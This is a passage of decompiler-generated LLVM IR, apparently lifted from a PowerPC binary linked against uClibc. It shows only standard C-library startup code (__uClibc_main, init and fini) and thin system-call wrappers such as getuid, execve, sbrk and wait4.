  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000bbb8 = inttoptr i32 %v0_1000bbac to i32*
  store i32 22, i32* %v2_1000bbb8, align 4
  %v0_1000bcf4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000bcf0

dec_label_pc_1000bcf0:                            ; preds = %dec_label_pc_1000bb88, %dec_label_pc_1000bbac
  %v0_1000bcf4 = phi i32 [ 1, %dec_label_pc_1000bb88 ], [ %v0_1000bcf4.pre, %dec_label_pc_1000bbac ]
  ret i32 %v0_1000bcf4

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 0 }
  uselistorder label %dec_label_pc_1000bcf0, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000bd54:
  %v3_1000bd58 = load i32, i32* @global_var_1001fde0.228, align 4
  %v3_1000bd5c = icmp eq i32 %v3_1000bd58, 0
  br i1 %v3_1000bd5c, label %dec_label_pc_1000bd6c, label %dec_label_pc_1000bd64

dec_label_pc_1000bd64:                            ; preds = %dec_label_pc_1000bd54
  %v2_1000bd68 = load i32, i32* @r4, align 4
  %v3_1000bd68 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32 %v2_1000bd68)
  store i32 %v3_1000bd68, i32* @r3, align 4
  br label %dec_label_pc_1000bd6c

dec_label_pc_1000bd6c:                            ; preds = %dec_label_pc_1000bd54, %dec_label_pc_1000bd64
  %v3_1000bd70 = load i32, i32* @global_var_1001fde4.229, align 4
  %v3_1000bd74 = icmp eq i32 %v3_1000bd70, 0
  br i1 %v3_1000bd74, label %dec_label_pc_1000bd6c.dec_label_pc_1000bd84_crit_edge, label %dec_label_pc_1000bd7c

dec_label_pc_1000bd6c.dec_label_pc_1000bd84_crit_edge: ; preds = %dec_label_pc_1000bd6c
  %v0_1000bd94.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000bd84

dec_label_pc_1000bd7c:                            ; preds = %dec_label_pc_1000bd6c
  %v2_1000bd80 = load i32, i32* @r4, align 4
  %v3_1000bd80 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32 %v2_1000bd80)
  br label %dec_label_pc_1000bd84

dec_label_pc_1000bd84:                            ; preds = %dec_label_pc_1000bd6c.dec_label_pc_1000bd84_crit_edge, %dec_label_pc_1000bd7c
  %v0_1000bd94 = phi i32 [ %v0_1000bd94.pre, %dec_label_pc_1000bd6c.dec_label_pc_1000bd84_crit_edge ], [ %v3_1000bd80, %dec_label_pc_1000bd7c ]
  ret i32 %v0_1000bd94

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bd84, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd6c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_1000bda0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000bda0
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268484040, i32* @lr, align 4
  %v2_1000bdc4 = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_1000bdc8 = icmp eq i32 %v2_1000bdc4, -1
  br i1 %v3_1000bdc8, label %dec_label_pc_1000bdd0, label %dec_label_pc_1000bdf0

dec_label_pc_1000bdd0:                            ; preds = %entry
  %v0_1000bdd4 = load i32, i32* @r30, align 4
  store i32 268484068, i32* @lr, align 4
  %v3_1000bde0 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_1000f948.230 to i32), i32 %v0_1000bdd4)
  %v1_1000bde4 = load i32, i32* @r31, align 4
  %v4_1000bde4 = icmp eq i32 %v3_1000bde0, %v1_1000bde4
  br i1 %v4_1000bde4, label %dec_label_pc_1000bdf0, label %dec_label_pc_1000bdec

dec_label_pc_1000bdec:                            ; preds = %dec_label_pc_1000bdd0
  %v1_1000bdec = call i32 @abort(i32 %v3_1000bde0)
  br label %dec_label_pc_1000bdf0

dec_label_pc_1000bdf0:                            ; preds = %entry, %dec_label_pc_1000bdd0, %dec_label_pc_1000bdec
  %v0_1000be00 = phi i32 [ %v2_1000bdc4, %entry ], [ %v3_1000bde0, %dec_label_pc_1000bdd0 ], [ %v1_1000bdec, %dec_label_pc_1000bdec ]
  ret i32 %v0_1000be00

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_open, { 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000bdf0, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000be24 = load i32, i32* @global_var_1001fde8.231, align 4
  %v3_1000be28 = icmp eq i32 %v3_1000be24, 0
  br i1 %v3_1000be28, label %dec_label_pc_1000be4c, label %entry.dec_label_pc_1000be70_crit_edge

entry.dec_label_pc_1000be70_crit_edge:            ; preds = %entry
  %v0_1000be80.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000be70

dec_label_pc_1000be4c:                            ; preds = %entry
  store i32 1, i32* @global_var_1001fde8.231, align 4
  store i32 4096, i32* @global_var_1001fddc.207, align 4
  %v1_1000be6c = call i32 @_stdio_init(i32 268470768)
  br label %dec_label_pc_1000be70

dec_label_pc_1000be70:                            ; preds = %entry.dec_label_pc_1000be70_crit_edge, %dec_label_pc_1000be4c
  %v0_1000be80 = phi i32 [ %v0_1000be80.pre, %entry.dec_label_pc_1000be70_crit_edge ], [ %v1_1000be6c, %dec_label_pc_1000be4c ]
  ret i32 %v0_1000be80

; uselistorder directives
  uselistorder label %dec_label_pc_1000be70, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1000be9c = mul i32 %arg2, 4
  %v2_1000bea0 = add i32 %tmp, %v1_1000be9c
  %v0_1000bea4 = load i32, i32* @r9, align 4
  store i32 %v0_1000bea4, i32* @global_var_1001fdd4.232, align 4
  %v1_1000bea8 = add i32 %v2_1000bea0, 4
  store i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 %v1_1000bea8, i32* @global_var_1001fdd8.224, align 4
  store i32 %arg6, i32* @global_var_1001fde4.229, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_1000bec8 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_1000bed0 = icmp eq i32 %v1_1000bea8, %v2_1000bec8
  br i1 %v4_1000bed0, label %dec_label_pc_1000bed8, label %dec_label_pc_1000bedc

dec_label_pc_1000bed8:                            ; preds = %entry
  store i32 %v2_1000bea0, i32* @global_var_1001fdd8.224, align 4
  br label %dec_label_pc_1000bedc

dec_label_pc_1000bedc:                            ; preds = %entry, %dec_label_pc_1000bed8
  %v2_1000bedc = ptrtoint i32* %stack_var_-168 to i32
  store i32 268484332, i32* @lr, align 4
  %v3_1000bee8 = call i32 @__GI_memset(i32 %v2_1000bedc, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1001fdd8.224, align 4
  br label %dec_label_pc_1000bef8

dec_label_pc_1000bef8:                            ; preds = %dec_label_pc_1000bef8, %dec_label_pc_1000bedc
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_1000bedc ], [ %v1_1000befc, %dec_label_pc_1000bef8 ]
  %v1_1000bef8 = inttoptr i32 %storemerge to i32*
  %v2_1000bef8 = load i32, i32* %v1_1000bef8, align 4
  %v1_1000befc = add i32 %storemerge, 4
  %v3_1000bf00 = icmp eq i32 %v2_1000bef8, 0
  br i1 %v3_1000bf00, label %dec_label_pc_1000bf08, label %dec_label_pc_1000bef8

dec_label_pc_1000bf08:                            ; preds = %dec_label_pc_1000bef8
  store i32 %v1_1000befc, i32* %r29.global-to-local, align 4
  %v1_1000bf3412 = inttoptr i32 %v1_1000befc to i32*
  %v2_1000bf3413 = load i32, i32* %v1_1000bf3412, align 4
  %v3_1000bf3816 = icmp eq i32 %v2_1000bf3413, 0
  br i1 %v3_1000bf3816, label %dec_label_pc_1000bf40, label %dec_label_pc_1000bf10

dec_label_pc_1000bf10:                            ; preds = %dec_label_pc_1000bf08, %dec_label_pc_1000bf30
  %v0_1000bf24 = phi i32 [ %v1_1000bf30, %dec_label_pc_1000bf30 ], [ %v1_1000befc, %dec_label_pc_1000bf08 ]
  %v0_1000bf18 = phi i32 [ %v2_1000bf34, %dec_label_pc_1000bf30 ], [ %v2_1000bf3413, %dec_label_pc_1000bf08 ]
  %v2_1000bf10 = icmp ugt i32 %v0_1000bf18, 14
  br i1 %v2_1000bf10, label %dec_label_pc_1000bf30, label %dec_label_pc_1000bf18

dec_label_pc_1000bf18:                            ; preds = %dec_label_pc_1000bf10
  %v1_1000bf18 = mul i32 %v0_1000bf18, 8
  %v2_1000bf20 = add i32 %v1_1000bf18, %v2_1000bedc
  store i32 %v2_1000bf20, i32* @r3, align 4
  store i32 %v0_1000bf24, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268484400, i32* @lr, align 4
  %v0_1000bf2c = call i32 @memcpy()
  %v0_1000bf30.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000bf30

dec_label_pc_1000bf30:                            ; preds = %dec_label_pc_1000bf10, %dec_label_pc_1000bf18
  %v0_1000bf30 = phi i32 [ %v0_1000bf24, %dec_label_pc_1000bf10 ], [ %v0_1000bf30.pre, %dec_label_pc_1000bf18 ]
  %v1_1000bf30 = add i32 %v0_1000bf30, 8
  store i32 %v1_1000bf30, i32* %r29.global-to-local, align 4
  %v1_1000bf34 = inttoptr i32 %v1_1000bf30 to i32*
  %v2_1000bf34 = load i32, i32* %v1_1000bf34, align 4
  %v3_1000bf38 = icmp eq i32 %v2_1000bf34, 0
  br i1 %v3_1000bf38, label %dec_label_pc_1000bf40, label %dec_label_pc_1000bf10

dec_label_pc_1000bf40:                            ; preds = %dec_label_pc_1000bf30, %dec_label_pc_1000bf08
  %v1_1000bf44 = call i32 @_dl_aux_init(i32 %v2_1000bedc)
  store i32 %v1_1000bf44, i32* @r3, align 4
  store i32 268484428, i32* @lr, align 4
  %v1_1000bf48 = call i32 @__GI___uClibc_init(i32 %v1_1000bf44)
  %v3_1000bf50 = icmp eq i32 %tmp27, 0
  br i1 %v3_1000bf50, label %dec_label_pc_1000bf58, label %dec_label_pc_1000bf5c

dec_label_pc_1000bf58:                            ; preds = %dec_label_pc_1000bf40
  br label %dec_label_pc_1000bf5c

dec_label_pc_1000bf5c:                            ; preds = %dec_label_pc_1000bf40, %dec_label_pc_1000bf58
  %v0_1000bf64 = phi i32 [ %tmp27, %dec_label_pc_1000bf40 ], [ 4096, %dec_label_pc_1000bf58 ]
  store i32 %v0_1000bf64, i32* @global_var_1001fddc.207, align 4
  %v3_1000bf68 = icmp eq i32 %tmp26, -1
  br i1 %v3_1000bf68, label %dec_label_pc_1000bf70, label %dec_label_pc_1000bfa4

dec_label_pc_1000bf70:                            ; preds = %dec_label_pc_1000bf5c
  store i32 268484468, i32* @lr, align 4
  %v1_1000bf70 = call i32 @getuid(i32 ptrtoint (i32* @global_var_10020000.2 to i32))
  store i32 %v1_1000bf70, i32* %r29.global-to-local, align 4
  store i32 268484476, i32* @lr, align 4
  %v0_1000bf78 = call i32 @geteuid()
  %v4_1000bf7c = icmp eq i32 %v1_1000bf70, %v0_1000bf78
  br i1 %v4_1000bf7c, label %dec_label_pc_1000bf84, label %dec_label_pc_1000bfc0

dec_label_pc_1000bf84:                            ; preds = %dec_label_pc_1000bf70
  store i32 268484488, i32* @lr, align 4
  %v1_1000bf84 = call i32 @getgid(i32 %v0_1000bf78)
  store i32 %v1_1000bf84, i32* %r29.global-to-local, align 4
  store i32 268484496, i32* @lr, align 4
  %v0_1000bf8c = call i32 @getegid()
  %v4_1000bf90 = icmp eq i32 %v1_1000bf84, %v0_1000bf8c
  br i1 %v4_1000bf90, label %dec_label_pc_1000bf98.thread, label %dec_label_pc_1000bfc0

dec_label_pc_1000bf98.thread:                     ; preds = %dec_label_pc_1000bf84
  br label %dec_label_pc_1000c09c

dec_label_pc_1000bfa4:                            ; preds = %dec_label_pc_1000bf5c
  %v4_1000bfa8 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_1000bfa8, label %dec_label_pc_1000bfb0, label %dec_label_pc_1000bfc0

dec_label_pc_1000bfb0:                            ; preds = %dec_label_pc_1000bfa4
  br label %dec_label_pc_1000bfc0

dec_label_pc_1000bfc0:                            ; preds = %dec_label_pc_1000bfb0, %dec_label_pc_1000bfa4, %dec_label_pc_1000bf84, %dec_label_pc_1000bf70
  store i32 268484560, i32* @lr, align 4
  %v2_1000bfcc = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268484576, i32* @lr, align 4
  %v2_1000bfdc = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268484592, i32* @lr, align 4
  %v2_1000bfec = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_1000c09c

dec_label_pc_1000c09c:                            ; preds = %dec_label_pc_1000bfc0, %dec_label_pc_1000bf98.thread
  %v0_1000bffc = load i32, i32* @r30, align 4
  %v1_1000bffc = inttoptr i32 %v0_1000bffc to i32*
  %v2_1000bffc = load i32, i32* %v1_1000bffc, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_1000bffc, i32* bitcast (i32** @global_var_1001fd94.233 to i32*), align 4
  %v0_1000c01c = load i32, i32* @r27, align 4
  store i32 %v0_1000c01c, i32* @global_var_1001fde0.228, align 4
  %v0_1000c048.pre = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_1000c048.pre)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000c0ac = call i32 @__errno_location()
  %v2_1000c0b4 = inttoptr i32 %v0_1000c0ac to i32*
  store i32 0, i32* %v2_1000c0b4, align 4
  %v0_1000c0e0 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_1000c0e0)
  %v0_1000c0ec = call i32 @__GI_exit()
  ret i32 %v0_1000c0ec

; uselistorder directives
  uselistorder i32 %v2_1000bf34, { 1, 0 }
  uselistorder i32 %v1_1000bf30, { 2, 1, 0 }
  uselistorder i32 %v1_1000befc, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_1000bedc, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @__GI_exit, { 0, 5, 4, 2, 1, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 4096, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10 }
  uselistorder i32 14, { 2, 0, 1 }
  uselistorder i32* @r25, { 0, 3, 1, 2 }
  uselistorder i32* @r26, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf30, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf10, { 1, 0 }
  uselistorder label %dec_label_pc_1000bedc, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_1000c0fc = load i32, i32* @r3, align 4
  store i32 %v0_1000c0fc, i32* @r29, align 4
  %v0_1000c104 = call i32 @__errno_location()
  %v0_1000c108 = load i32, i32* @r29, align 4
  %v2_1000c108 = inttoptr i32 %v0_1000c104 to i32*
  store i32 %v0_1000c108, i32* %v2_1000c108, align 4
  ret i32 -1
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c13c = call i32 @__asm_mfcr()
  %v1_1000c140 = and i32 %v0_1000c13c, 268435456
  %v3_1000c140 = icmp eq i32 %v1_1000c140, 0
  store i32 %v0_1000c13c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c140, label %dec_label_pc_1000c158, label %dec_label_pc_1000c14c

dec_label_pc_1000c14c:                            ; preds = %entry
  %v0_1000c14c = call i32 @__errno_location()
  %v0_1000c150 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c150 = inttoptr i32 %v0_1000c14c to i32*
  store i32 %v0_1000c150, i32* %v2_1000c150, align 4
  br label %dec_label_pc_1000c158

dec_label_pc_1000c158:                            ; preds = %entry, %dec_label_pc_1000c14c
  %v0_1000c168 = phi i32 [ %v0_1000c13c, %entry ], [ -1, %dec_label_pc_1000c14c ]
  ret i32 %v0_1000c168

; uselistorder directives
  uselistorder label %dec_label_pc_1000c158, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c184 = call i32 @__asm_mfcr()
  %v1_1000c188 = and i32 %v0_1000c184, 268435456
  %v3_1000c188 = icmp eq i32 %v1_1000c188, 0
  store i32 %v0_1000c184, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c188, label %dec_label_pc_1000c1a0, label %dec_label_pc_1000c194

dec_label_pc_1000c194:                            ; preds = %entry
  %v0_1000c194 = call i32 @__errno_location()
  %v0_1000c198 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c198 = inttoptr i32 %v0_1000c194 to i32*
  store i32 %v0_1000c198, i32* %v2_1000c198, align 4
  br label %dec_label_pc_1000c1a0

dec_label_pc_1000c1a0:                            ; preds = %entry, %dec_label_pc_1000c194
  %v0_1000c1b0 = phi i32 [ %v0_1000c184, %entry ], [ -1, %dec_label_pc_1000c194 ]
  ret i32 %v0_1000c1b0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c1a0, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c1cc = call i32 @__asm_mfcr()
  %v1_1000c1d0 = and i32 %v0_1000c1cc, 268435456
  %v3_1000c1d0 = icmp eq i32 %v1_1000c1d0, 0
  store i32 %v0_1000c1cc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c1d0, label %dec_label_pc_1000c1e8, label %dec_label_pc_1000c1dc

dec_label_pc_1000c1dc:                            ; preds = %entry
  %v0_1000c1dc = call i32 @__errno_location()
  %v0_1000c1e0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c1e0 = inttoptr i32 %v0_1000c1dc to i32*
  store i32 %v0_1000c1e0, i32* %v2_1000c1e0, align 4
  br label %dec_label_pc_1000c1e8

dec_label_pc_1000c1e8:                            ; preds = %entry, %dec_label_pc_1000c1dc
  %v0_1000c1f8 = phi i32 [ %v0_1000c1cc, %entry ], [ -1, %dec_label_pc_1000c1dc ]
  ret i32 %v0_1000c1f8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c1e8, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c214 = call i32 @__asm_mfcr()
  %v1_1000c218 = and i32 %v0_1000c214, 268435456
  %v3_1000c218 = icmp eq i32 %v1_1000c218, 0
  store i32 %v0_1000c214, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c218, label %dec_label_pc_1000c230, label %dec_label_pc_1000c224

dec_label_pc_1000c224:                            ; preds = %entry
  %v0_1000c224 = call i32 @__errno_location()
  %v0_1000c228 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c228 = inttoptr i32 %v0_1000c224 to i32*
  store i32 %v0_1000c228, i32* %v2_1000c228, align 4
  br label %dec_label_pc_1000c230

dec_label_pc_1000c230:                            ; preds = %entry, %dec_label_pc_1000c224
  %v0_1000c240 = phi i32 [ %v0_1000c214, %entry ], [ -1, %dec_label_pc_1000c224 ]
  ret i32 %v0_1000c240

; uselistorder directives
  uselistorder label %dec_label_pc_1000c230, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c25c = call i32 @__asm_mfcr()
  %v1_1000c260 = and i32 %v0_1000c25c, 268435456
  %v3_1000c260 = icmp eq i32 %v1_1000c260, 0
  store i32 %v0_1000c25c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c260, label %dec_label_pc_1000c278, label %dec_label_pc_1000c26c

dec_label_pc_1000c26c:                            ; preds = %entry
  %v0_1000c26c = call i32 @__errno_location()
  %v0_1000c270 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c270 = inttoptr i32 %v0_1000c26c to i32*
  store i32 %v0_1000c270, i32* %v2_1000c270, align 4
  br label %dec_label_pc_1000c278

dec_label_pc_1000c278:                            ; preds = %entry, %dec_label_pc_1000c26c
  %v0_1000c288 = phi i32 [ %v0_1000c25c, %entry ], [ -1, %dec_label_pc_1000c26c ]
  ret i32 %v0_1000c288

; uselistorder directives
  uselistorder label %dec_label_pc_1000c278, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c2a4 = call i32 @__asm_mfcr()
  %v1_1000c2a8 = and i32 %v0_1000c2a4, 268435456
  %v3_1000c2a8 = icmp eq i32 %v1_1000c2a8, 0
  store i32 %v0_1000c2a4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c2a8, label %dec_label_pc_1000c2c0, label %dec_label_pc_1000c2b4

dec_label_pc_1000c2b4:                            ; preds = %entry
  %v0_1000c2b4 = call i32 @__errno_location()
  %v0_1000c2b8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c2b8 = inttoptr i32 %v0_1000c2b4 to i32*
  store i32 %v0_1000c2b8, i32* %v2_1000c2b8, align 4
  br label %dec_label_pc_1000c2c0

dec_label_pc_1000c2c0:                            ; preds = %entry, %dec_label_pc_1000c2b4
  %v0_1000c2d0 = phi i32 [ %v0_1000c2a4, %entry ], [ -1, %dec_label_pc_1000c2b4 ]
  ret i32 %v0_1000c2d0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c2c0, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_1000c2dc = load i32, i32* @global_var_1001fddc.207, align 4
  %v3_1000c2e0 = icmp eq i32 %v3_1000c2dc, 0
  %v0_1000c2e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000c2e0, i32 %v0_1000c2e4)
  ret i32 %v3_1000c2dc
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c308 = call i32 @__asm_mfcr()
  %v1_1000c30c = and i32 %v0_1000c308, 268435456
  %v3_1000c30c = icmp eq i32 %v1_1000c30c, 0
  store i32 %v0_1000c308, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c30c, label %dec_label_pc_1000c324, label %dec_label_pc_1000c318

dec_label_pc_1000c318:                            ; preds = %entry
  %v0_1000c318 = call i32 @__errno_location()
  %v0_1000c31c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c31c = inttoptr i32 %v0_1000c318 to i32*
  store i32 %v0_1000c31c, i32* %v2_1000c31c, align 4
  br label %dec_label_pc_1000c324

dec_label_pc_1000c324:                            ; preds = %entry, %dec_label_pc_1000c318
  %v0_1000c334 = phi i32 [ %v0_1000c308, %entry ], [ -1, %dec_label_pc_1000c318 ]
  ret i32 %v0_1000c334

; uselistorder directives
  uselistorder label %dec_label_pc_1000c324, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c350 = call i32 @__asm_mfcr()
  %v1_1000c354 = and i32 %v0_1000c350, 268435456
  %v3_1000c354 = icmp eq i32 %v1_1000c354, 0
  store i32 %v0_1000c350, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c354, label %dec_label_pc_1000c36c, label %dec_label_pc_1000c360

dec_label_pc_1000c360:                            ; preds = %entry
  %v0_1000c360 = call i32 @__errno_location()
  %v0_1000c364 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c364 = inttoptr i32 %v0_1000c360 to i32*
  store i32 %v0_1000c364, i32* %v2_1000c364, align 4
  br label %dec_label_pc_1000c36c

dec_label_pc_1000c36c:                            ; preds = %entry, %dec_label_pc_1000c360
  %v0_1000c37c = phi i32 [ %v0_1000c350, %entry ], [ -1, %dec_label_pc_1000c360 ]
  ret i32 %v0_1000c37c

; uselistorder directives
  uselistorder label %dec_label_pc_1000c36c, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_1000c39c = load i32, i32* @global_var_1001fe00.236, align 4
  %v3_1000c3a0 = icmp eq i32 %v3_1000c39c, 0
  br i1 %v3_1000c3a0, label %dec_label_pc_1000c3a8, label %dec_label_pc_1000c3b4

dec_label_pc_1000c3a8:                            ; preds = %entry
  store i32 268485548, i32* @lr, align 4
  %v1_1000c3a8 = call i32 @__GI_brk(i32 0)
  %v1_1000c3ac = icmp slt i32 %v1_1000c3a8, 0
  br i1 %v1_1000c3ac, label %dec_label_pc_1000c3d4, label %dec_label_pc_1000c3a8.dec_label_pc_1000c3b4_crit_edge

dec_label_pc_1000c3a8.dec_label_pc_1000c3b4_crit_edge: ; preds = %dec_label_pc_1000c3a8
  %v0_1000c3b4.pre = load i32, i32* @r30, align 4
  %v3_1000c3b8.pre = load i32, i32* @global_var_1001fe00.236, align 4
  br label %dec_label_pc_1000c3b4

dec_label_pc_1000c3b4:                            ; preds = %dec_label_pc_1000c3a8.dec_label_pc_1000c3b4_crit_edge, %entry
  %v3_1000c3b8 = phi i32 [ %v3_1000c3b8.pre, %dec_label_pc_1000c3a8.dec_label_pc_1000c3b4_crit_edge ], [ %v3_1000c39c, %entry ]
  %v1_1000c3c0 = phi i32 [ %v0_1000c3b4.pre, %dec_label_pc_1000c3a8.dec_label_pc_1000c3b4_crit_edge ], [ %arg1, %entry ]
  %v3_1000c3b4 = icmp eq i32 %v1_1000c3c0, 0
  store i32 %v3_1000c3b8, i32* @r31, align 4
  br i1 %v3_1000c3b4, label %dec_label_pc_1000c3d8, label %dec_label_pc_1000c3c8

dec_label_pc_1000c3c8:                            ; preds = %dec_label_pc_1000c3b4
  %v2_1000c3c0 = add i32 %v1_1000c3c0, %v3_1000c3b8
  store i32 268485580, i32* @lr, align 4
  %v1_1000c3c8 = call i32 @__GI_brk(i32 %v2_1000c3c0)
  %tmp6 = icmp sgt i32 %v1_1000c3c8, -1
  br i1 %tmp6, label %dec_label_pc_1000c3c8.dec_label_pc_1000c3d8_crit_edge, label %dec_label_pc_1000c3d4

dec_label_pc_1000c3c8.dec_label_pc_1000c3d8_crit_edge: ; preds = %dec_label_pc_1000c3c8
  %v0_1000c3dc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c3d8

dec_label_pc_1000c3d4:                            ; preds = %dec_label_pc_1000c3c8, %dec_label_pc_1000c3a8
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_1000c3d8

dec_label_pc_1000c3d8:                            ; preds = %dec_label_pc_1000c3c8.dec_label_pc_1000c3d8_crit_edge, %dec_label_pc_1000c3b4, %dec_label_pc_1000c3d4
  %v0_1000c3dc = phi i32 [ %v0_1000c3dc.pre, %dec_label_pc_1000c3c8.dec_label_pc_1000c3d8_crit_edge ], [ %v3_1000c3b8, %dec_label_pc_1000c3b4 ], [ -1, %dec_label_pc_1000c3d4 ]
  ret i32 %v0_1000c3dc

; uselistorder directives
  uselistorder i32 %v3_1000c3b8, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_1000c3d8, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c408 = call i32 @__asm_mfcr()
  %v1_1000c40c = and i32 %v0_1000c408, 268435456
  %v3_1000c40c = icmp eq i32 %v1_1000c40c, 0
  store i32 %v0_1000c408, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c40c, label %dec_label_pc_1000c424, label %dec_label_pc_1000c418

dec_label_pc_1000c418:                            ; preds = %entry
  %v0_1000c418 = call i32 @__errno_location()
  %v0_1000c41c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c41c = inttoptr i32 %v0_1000c418 to i32*
  store i32 %v0_1000c41c, i32* %v2_1000c41c, align 4
  br label %dec_label_pc_1000c424

dec_label_pc_1000c424:                            ; preds = %entry, %dec_label_pc_1000c418
  %v0_1000c434 = phi i32 [ %v0_1000c408, %entry ], [ -1, %dec_label_pc_1000c418 ]
  ret i32 %v0_1000c434

; uselistorder directives
  uselistorder label %dec_label_pc_1000c424, { 1, 0 }
}

